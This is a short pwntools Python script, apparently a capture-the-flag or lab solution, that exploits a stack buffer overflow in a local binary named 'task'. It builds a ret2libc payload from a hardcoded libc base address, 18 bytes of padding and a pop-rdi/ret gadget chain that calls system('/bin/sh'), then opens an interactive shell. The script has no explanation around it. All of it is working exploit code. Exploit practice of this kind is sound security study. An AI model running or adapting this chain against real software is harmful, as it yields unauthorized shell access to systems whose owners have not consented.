from pwn import *
from pwn import p64

pro = process("./task")
rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc_base_address = 0x7FFFF7C00000
system_func = libc_base_address + elf.symbols["system"]
exit_func = libc_base_address + elf.symbols["exit"]
sh_addr = libc_base_address + next(elf.search(b"/bin/sh"))
ret_addr = libc_base_address + rop.find_gadget(["ret"]).address
rdi_addr = libc_base_address + rop.find_gadget(["pop rdi", "ret"]).address

payload = b"A" * 18
payload += p64(rdi_addr)
payload += p64(sh_addr)
payload += p64(ret_addr)
payload += p64(system_func)
payload += p64(exit_func)

pro.sendline(payload)
pro.interactive()
